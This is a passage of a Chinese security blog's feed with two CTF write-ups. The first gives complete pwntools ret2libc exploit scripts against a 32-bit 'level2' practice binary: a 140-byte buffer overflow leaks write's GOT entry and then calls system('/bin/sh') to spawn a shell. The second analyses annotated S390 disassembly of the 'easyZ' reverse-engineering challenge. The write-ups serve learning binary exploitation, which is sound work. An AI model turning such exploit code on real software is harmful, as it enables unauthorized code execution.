src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061108269.png" alt="image-20210806110830206"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061110269.png" alt="image-20210806111045205"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061111361.png" alt="image-20210806111141314"></p><p>和我写代码的算出来不一样啊</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061112158.png" alt="image-20210806111233107"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061113443.png" alt="image-20210806111307393"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x9aee0 - 0x99b80)</span><br><span class="line">&#x27;0x1360&#x27;</span><br><span class="line">&gt;&gt;&gt; hex(0x85e9b - 0x84c5b)</span><br><span class="line">&#x27;0x1240&#x27;</span><br></pre></td></tr></table></figure><p>想不明白啊呜呜呜</p><p>用手算的0x9aee0和0x85e9b写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">w_sys = <span class="number">0x9aee0</span></span><br><span class="line">w_bin = <span class="number">0x85e9b</span></span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr=&#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;system&#x27;]=&quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;next(libc.search(&#x27;/bin/sh&#x27;))&quot;</span> + <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))&quot;</span> + <span class="built_in">hex</span>((libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - w_sys</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr = write_addr + w_bin</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/202108061142976.png" alt="image-20210806114259908"></p><p>成功拿到shell，这个问题以后回来解决（咕咕咕🕊）</p><p>再kali中system地址对了，字符串”/bin/sh”部分错了通过动调发现少了0x40 给补上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./level2&#x27;</span>)</span><br><span class="line">plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;symbols[&#x27;write&#x27;] = &quot;</span> + <span class="built_in">hex</span>(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;plt_write= &#x27;</span> + <span class="built_in">hex</span>(plt_write)</span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;got_write= &#x27;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line"></span><br><span class="line">vulfun_addr = <span class="number">0x804843b</span></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(got_write) + p32(<span class="number">4</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;write_addr= &#x27;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;system&#x27;]= &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;next(libc.search(&#x27;/bin/sh&#x27;))= &quot;</span> + <span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc.symbols[&#x27;write&#x27;] - libc.symbols[&#x27;system&#x27;] = &quot;</span> + <span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;(libc.symbols[&#x27;write&#x27;] - next(libc.search(&#x27;/bin/sh&#x27;)))= &quot;</span> + <span class="built_in">hex</span>((libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))))</span><br><span class="line"></span><br><span class="line">system_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr= &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = write_addr - (libc.symbols[<span class="string">&#x27;write&#x27;</span>] - <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))) - <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;binsh_addr= &#x27;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span>  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>应该是因为环境影响，尚且未找到解决方法</p><h3 id="假如没有libc-so怎么办"><a href="#假如没有libc-so怎么办" class="headerlink" title="假如没有libc.so怎么办"></a>假如没有libc.so怎么办</h3><p>利用LibcSearcher</p><p>可以利用它找出偏移</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一步一步学ROP之linux-x86学习&quot;&gt;&lt;a href=&quot;#一步一步学ROP之linux-x86学习&quot; class=&quot;headerlink&quot; title=&quot;一步一步学ROP之linux_x86学习&quot;&gt;&lt;/a&gt;一步一步学ROP之linux_x86学习&lt;/h1&gt;&lt;</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>2020 湖湘杯 easyZ 框架(S390)</title>
    <link href="http://example.com/2021/08/13/%E6%B9%96%E6%B9%98%E6%9D%AFS390/"/>
    <id>http://example.com/2021/08/13/%E6%B9%96%E6%B9%98%E6%9D%AFS390/</id>
    <published>2021-08-13T11:39:43.683Z</published>
    <updated>2021-08-13T07:47:35.233Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easyZ"><a href="#easyZ" class="headerlink" title="easyZ"></a>easyZ</h1><p>一点都不简单好吗，框架(S390)都看不出来🤪</p><p>先用ida打开发现不能反汇编</p><p>用linux的objdump看看框架</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150240.png" alt="image-20201117195652477"></p><p>好像没有S390</p><p>在kali中装上qemu来模拟程序运行发现</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150317.png" alt="image-20201117175913716"></p><p>发现可以搜索的关键字符串</p><p>在hex.txt中查找到相应字符串及它的地址</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150331.png" alt="image-20201117180221169"></p><p>去dis.txt中搜索有那些有用到1071060左右地址的行，找到函数主体</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150338.png" alt="image-20201117202007252"></p><p>开始分析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">1000b38:eb bf f0 58 00 24 stmg%r11,%r15,88(%r15)//主函数</span><br><span class="line">1000b3e:e3 f0 ff 20 ff 71 lay%r15,-224(%r15)</span><br><span class="line">1000b44:b9 04 00 bf       lgr%r11,%r15</span><br><span class="line">1000b48:b2 4f 00 10       ear%r1,%a0</span><br><span class="line">1000b4c:eb 11 00 20 00 0d sllg%r1,%r1,32</span><br><span class="line">1000b52:b2 4f 00 11       ear%r1,%a1</span><br><span class="line">1000b56:d2 07 b0 d8 10 28 mvc216(8,%r11),40(%r1)</span><br><span class="line">1000b5c:c0 20 00 03 82 84 larl%r2,0x1071064  //Please input your string:</span><br><span class="line">1000b62:c0 e5 00 00 40 43 brasl%r14,0x1008be8 //加载函数地址0x1008be8 (printf)</span><br><span class="line">1000b68:ec 1b 00 a6 00 d9 aghik%r1,%r11,166</span><br><span class="line">1000b6e:b9 04 00 31       lgr%r3,%r1</span><br><span class="line">1000b72:c0 20 00 03 82 87 larl%r2,0x1071080  //准备读取输入字符串</span><br><span class="line">1000b78:c0 e5 00 00 3a 5c brasl%r14,0x1008030 //调用输入函数(scanf)</span><br><span class="line">1000b7e:ec 1b 00 a6 00 d9 aghik%r1,%r11,166</span><br><span class="line">1000b84:b9 04 00 21       lgr%r2,%r1          //store r2,r1  将r2存到后面的r1里</span><br><span class="line">1000b88:c0 e5 ff ff fe c4 brasl%r14,0x1000910 //加载函数地址0x1000910（函数1）</span><br><span class="line">1000b8e:b9 04 00 12       lgr%r1,%r2</span><br><span class="line">1000b92:12 11             ltr%r1,%r1</span><br><span class="line">1000b94:a7 84 00 17       je0x1000bc2</span><br><span class="line">1000b98:ec 1b 00 a6 00 d9 aghik%r1,%r11,166</span><br><span class="line">1000b9e:b9 04 00 21       lgr%r2,%r1</span><br><span class="line">1000ba2:c0 e5 ff ff ff 33 brasl%r14,0x1000a08 //加载函数地址0x1000a08（函数2）</span><br><span class="line">1000ba8:b9 04 00 12       lgr%r1,%r2</span><br><span class="line">1000bac:12 11             ltr%r1,%r1</span><br><span class="line">1000bae:a7 84 00 0a       je0x1000bc2</span><br><span class="line">1000bb2:c0 20 00 03 82 69 larl%r2,0x1071084 //you win</span><br><span class="line">1000bb8:c0 e5 00 00 40 18 brasl%r14,0x1008be8//加载函数地址0x1008be8 (printf)</span><br><span class="line">1000bbe:a7 f4 00 08       j0x1000bce</span><br><span class="line">1000bc2:c0 20 00 03 82 66 larl%r2,0x107108e //you lose</span><br><span class="line">1000bc8:c0 e5 00 00 40 10 brasl%r14,0x1008be8//加载函数地址0x1008be8 (printf)</span><br><span class="line">1000bce:a7 18 00 00       lhi%r1,0</span><br><span class="line">1000bd2:b9 14 00 11       lgfr%r1,%r1</span><br><span class="line">1000bd6:b9 04 00 21       lgr%r2,%r1</span><br><span class="line">1000bda:b2 4f 00 10       ear%r1,%a0</span><br><span class="line">1000bde:eb 11 00 20 00 0d sllg%r1,%r1,32</span><br><span class="line">1000be4:b2 4f 00 11       ear%r1,%a1</span><br><span class="line">1000be8:d5 07 b0 d8 10 28 clc216(8,%r11),40(%r1)</span><br><span class="line">1000bee:a7 84 00 05       je0x1000bf8</span><br><span class="line">1000bf2:c0 e5 00 00 e5 2b brasl%r14,0x101d648</span><br><span class="line">1000bf8:e3 40 b1 50 00 04 lg%r4,336(%r11)</span><br><span class="line">1000bfe:eb bf b1 38 00 04 lmg%r11,%r15,312(%r11)</span><br><span class="line">1000c04:07 f4             br%r4 </span><br><span class="line">1000c06:07 07             nopr%r7   //无操作</span><br></pre></td></tr></table></figure><p>可以看出用了两个函数在里面一个地址0x1000910，另一个地址0x1000a08</p><p>先看地址0x1000910得函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">1000910:eb bf f0 58 00 24 stmg%r11,%r15,88(%r15)</span><br><span class="line"> 1000916:e3 f0 ff 50 ff 71 lay%r15,-176(%r15)</span><br><span class="line"> 100091c:b9 04 00 bf       lgr%r11,%r15</span><br><span class="line"> 1000920:e3 20 b0 a0 00 24 stg%r2,160(%r11)</span><br><span class="line"> 1000926:e3 20 b0 a0 00 04 lg%r2,160(%r11)</span><br><span class="line"> 100092c:c0 e5 ff ff ff 02 brasl%r14,0x1000730//加载函数地址0x1000730 (strlen)</span><br><span class="line"> 1000932:b9 04 00 12       lgr%r1,%r2</span><br><span class="line"> 1000936:a7 1f 00 20       cghi%r1,32  //cmp len(input)，32</span><br><span class="line"> 100093a:a7 84 00 06       je0x1000946</span><br><span class="line"> 100093e:a7 18 00 00       lhi%r1,0</span><br><span class="line"> 1000942:a7 f4 00 56       j0x10009ee</span><br><span class="line"> 1000946:e5 4c b0 ac 00 00 mvhi172(%r11),0</span><br><span class="line"> 100094c:a7 f4 00 49       j0x10009de</span><br><span class="line"> 1000950:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 1000956:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 100095c:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 1000960:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 1000964:c2 1f 00 00 00 2f clfi%r1,47   //(0) </span><br><span class="line"> 100096a:a7 c4 00 11       jle0x100098c    </span><br><span class="line"> 100096e:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 1000974:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 100097a:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 100097e:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 1000982:c2 1f 00 00 00 39 clfi%r1,57    //(9)</span><br><span class="line"> 1000988:a7 c4 00 24       jle0x10009d0</span><br><span class="line"> 100098c:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 1000992:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 1000998:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 100099c:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 10009a0:c2 1f 00 00 00 60 clfi%r1,96    //(a)</span><br><span class="line"> 10009a6:a7 c4 00 11       jle0x10009c8</span><br><span class="line"> 10009aa:e3 10 b0 ac 00 14 lgf%r1,172(%r11)</span><br><span class="line"> 10009b0:e3 10 b0 a0 00 08 ag%r1,160(%r11)</span><br><span class="line"> 10009b6:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 10009ba:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 10009be:c2 1f 00 00 00 66 clfi%r1,102   //(f)</span><br><span class="line"> 10009c4:a7 c4 00 09       jle0x10009d6</span><br><span class="line"> 10009c8:a7 18 00 00       lhi%r1,0</span><br><span class="line"> 10009cc:a7 f4 00 11       j0x10009ee</span><br><span class="line"> 10009d0:18 00             lr%r0,%r0</span><br><span class="line"> 10009d2:a7 f4 00 03       j0x10009d8</span><br><span class="line"> 10009d6:18 00             lr%r0,%r0</span><br><span class="line"> 10009d8:eb 01 b0 ac 00 6a asi172(%r11),1</span><br><span class="line"> 10009de:58 10 b0 ac       l%r1,172(%r11)</span><br><span class="line"> 10009e2:a7 1e 00 1f       chi%r1,31        //循环判断是否超过input[31]</span><br><span class="line"> 10009e6:a7 c4 ff b5       jle0x1000950</span><br><span class="line"> 10009ea:a7 18 00 01       lhi%r1,1</span><br><span class="line"> 10009ee:b9 14 00 11       lgfr%r1,%r1</span><br><span class="line"> 10009f2:b9 04 00 21       lgr%r2,%r1</span><br><span class="line"> 10009f6:e3 40 b1 20 00 04 lg%r4,288(%r11)</span><br><span class="line"> 10009fc:eb bf b1 08 00 04 lmg%r11,%r15,264(%r11)</span><br><span class="line"> 1000a02:07 f4             br%r4</span><br><span class="line"> 1000a04:07 07             nopr%r7</span><br><span class="line"> 1000a06:07 07             nopr%r7</span><br></pre></td></tr></table></figure><p><strong>可以看出这是一个循环，flag的长度为32，而且是0<del>9，a</del>f之间的字符</strong></p><p>看第二个地址0x1000a08的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">1000a08:b3 c1 00 2b       ldgr%f2,%r11</span><br><span class="line"> 1000a0c:b3 c1 00 0f       ldgr%f0,%r15</span><br><span class="line"> 1000a10:e3 f0 ff 48 ff 71 lay%r15,-184(%r15)</span><br><span class="line"> 1000a16:b9 04 00 bf       lgr%r11,%r15</span><br><span class="line"> 1000a1a:e3 20 b0 a0 00 24 stg%r2,160(%r11)    </span><br><span class="line"> 1000a20:e5 4c b0 a8 00 00 mvhi168(%r11),0</span><br><span class="line"> 1000a26:a7 f4 00 4b       j0x1000abc</span><br><span class="line"> 1000a2a:e3 10 b0 a8 00 14 lgf%r1,168(%r11)</span><br><span class="line"> 1000a30:e3 10 b0 a0 00 08 ag%r1,160(%r11)   //r1 = input[i]</span><br><span class="line"> 1000a36:43 10 10 00       ic%r1,0(%r1)</span><br><span class="line"> 1000a3a:b9 94 00 11       llcr%r1,%r1</span><br><span class="line"> 1000a3e:50 10 b0 b4       st%r1,180(%r11)   //r11[180] = r1</span><br><span class="line"> 1000a42:58 30 b0 b4       l%r3,180(%r11)   //r3 = r1 (r3 = input)</span><br><span class="line"> 1000a46:71 30 b0 b4       ms%r3,180(%r11)   //r3*r3   (input*input)</span><br><span class="line"> 1000a4a:c0 10 00 04 d3 ef larl%r1,0x109b228</span><br><span class="line"> 1000a50:e3 20 b0 a8 00 14 lgf%r2,168(%r11)</span><br><span class="line"> 1000a56:eb 22 00 02 00 0d sllg%r2,%r2,2  // &lt;&lt; 2 (相当于*4)</span><br><span class="line"> 1000a5c:58 12 10 00       l%r1,0(%r2,%r1) //0x109b228[i&lt;&lt;2]</span><br><span class="line"> 1000a60:b2 52 00 31       msr%r3,%r1        //0x109b228[i&lt;&lt;2]*r3[i]*r3[i](r3变化)</span><br><span class="line">    //(0x109b228[i&lt;&lt;2]*input[i]*input[i])</span><br><span class="line"> 1000a64:c0 10 00 04 d3 e2 larl%r1,0x109b228</span><br><span class="line"> 1000a6a:e3 20 b0 a8 00 14 lgf%r2,168(%r11)</span><br><span class="line"> 1000a70:a7 2b 00 20       aghi%r2,32</span><br><span class="line"> 1000a74:eb 22 00 02 00 0d sllg%r2,%r2,2  //r2 = r2 &lt;&lt; 2</span><br><span class="line"> 1000a7a:58 12 10 00       l%r1,0(%r2,%r1) //0x109b228[(i+32)&lt;&lt;2]</span><br><span class="line"> 1000a7e:71 10 b0 b4       ms%r1,180(%r11)  //0x109b228[(i+32)&lt;&lt;2]*input[i](r1变化)</span><br><span class="line"> 1000a82:1a 31             ar%r3,%r1        //0x109b228[i&lt;&lt;2]*input[i]*input[i] + 0x109b228[(i+32)&lt;&lt;2]*input[i]</span><br><span class="line"> 1000a84:c0 10 00 04 d3 d2 larl%r1,0x109b228</span><br><span class="line"> 1000a8a:e3 20 b0 a8 00 14 lgf%r2,168(%r11)  //i</span><br><span class="line"> 1000a90:a7 2b 00 40       aghi%r2,64     //i+64</span><br><span class="line"> 1000a94:eb 22 00 02 00 0d sllg%r2,%r2,2  //(i+64) &lt;&lt; 2</span><br><span class="line"> 1000a9a:58 12 10 00       l%r1,0(%r2,%r1) //r1 = 0x109b228[(i+64) &lt;&lt; 2]</span><br><span class="line"> 1000a9e:1a 31             ar%r3,%r1        //add r3 + 0x109b228[(i+64) &lt;&lt; 2]</span><br><span class="line"> 1000aa0:c4 18 00 04 d3 68 lgrl%r1,0x109b170</span><br><span class="line"> 1000aa6:e3 20 b0 a8 00 14 lgf%r2,168(%r11)  //i</span><br><span class="line"> 1000aac:eb 22 00 02 00 0d sllg%r2,%r2,2  // i &lt;&lt; 2  </span><br><span class="line"> 1000ab2:50 32 10 00       st%r3,0(%r2,%r1) //r1[r2] = r3</span><br><span class="line"> 1000ab6:eb 01 b0 a8 00 6a asi168(%r11),1    //i++;</span><br><span class="line"> 1000abc:58 10 b0 a8       l%r1,168(%r11)</span><br><span class="line"> 1000ac0:a7 1e 00 1f       chi%r1,31</span><br><span class="line"> 1000ac4:a7 c4 ff b3       jle0x1000a2a   //cmp</span><br><span class="line"> 1000ac8:e5 4c b0 ac 00 01 mvhi172(%r11),1</span><br><span class="line"> 1000ace:e5 4c b0 b0 00 00 mvhi176(%r11),0</span><br><span class="line"> 1000ad4:a7 f4 00 21       j0x1000b16</span><br><span class="line"> 1000ad8:c4 18 00 04 d3 4c lgrl%r1,0x109b170 //循环判断</span><br><span class="line"> 1000ade:e3 20 b0 b0 00 14 lgf%r2,176(%r11)</span><br><span class="line"> 1000ae4:eb 22 00 02 00 0d sllg%r2,%r2,2</span><br><span class="line"> 1000aea:58 32 10 00       l%r3,0(%r2,%r1)</span><br><span class="line"> 1000aee:c0 10 00 04 d3 5d larl%r1,0x109b1a8</span><br><span class="line"> 1000af4:e3 20 b0 b0 00 14 lgf%r2,176(%r11)</span><br><span class="line"> 1000afa:eb 22 00 02 00 0d sllg%r2,%r2,2</span><br><span class="line"> 1000b00:58 12 10 00       l%r1,0(%r2,%r1)</span><br><span class="line"> 1000b04:19 31             cr%r3,%r1</span><br><span class="line"> 1000b06:a7 84 00 05       je0x1000b10</span><br><span class="line"> 1000b0a:e5 4c b0 ac 00 00 mvhi172(%r11),0</span><br><span class="line"> 1000b10:eb 01 b0 b0 00 6a asi176(%r11),1</span><br><span class="line"> 1000b16:58 10 b0 b0       l%r1,176(%r11)</span><br><span class="line"> 1000b1a:a7 1e 00 1f       chi%r1,31//cmp</span><br><span class="line"> 1000b1e:a7 c4 ff dd       jle0x1000ad8</span><br><span class="line"> 1000b22:58 10 b0 ac       l%r1,172(%r11)</span><br><span class="line"> 1000b26:b9 14 00 11       lgfr%r1,%r1</span><br><span class="line"> 1000b2a:b9 04 00 21       lgr%r2,%r1</span><br><span class="line"> 1000b2e:b3 cd 00 b2       lgdr%r11,%f2</span><br><span class="line"> 1000b32:b3 cd 00 f0       lgdr%r15,%f0</span><br><span class="line"> 1000b36:07 fe             br%r14</span><br></pre></td></tr></table></figure><p>可以看出地址0x1000a08的函数将0x109b228的值与0x109b1a8中的值做比较，提取数据可以直接爆破了</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725150421.png" alt="image-20201122212606748"></p><figure class="highlight 